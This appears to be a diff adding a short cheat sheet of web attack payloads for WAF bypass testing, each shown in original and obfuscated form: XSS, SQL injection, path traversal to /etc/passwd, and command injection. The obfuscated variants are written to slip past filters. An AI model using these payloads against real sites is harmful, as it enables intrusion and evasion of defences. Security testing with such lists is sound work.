@@ -1,0 +1,17 @@
+Original vs Obfuscated Payloads for WAF Bypass Testing
+
+1. XSS Payload:
+Original: <script>alert(1)</script>
+Obfuscated: <scr<script>ipt>alert(1)</scr</script>ipt>
+
+2. SQL Injection:
+Original: ' OR '1'='1
+Obfuscated: %27%20oR%20%271%27%3D%271
+
+3. LFI (Local File Inclusion):
+Original: ../../etc/passwd
+Obfuscated: %2e%2e%2f%2e%2e%2fetc/passwd
+
+4. Command Injection:
+Original: ; ls -la
+Obfuscated: %3b%20ls%20-la
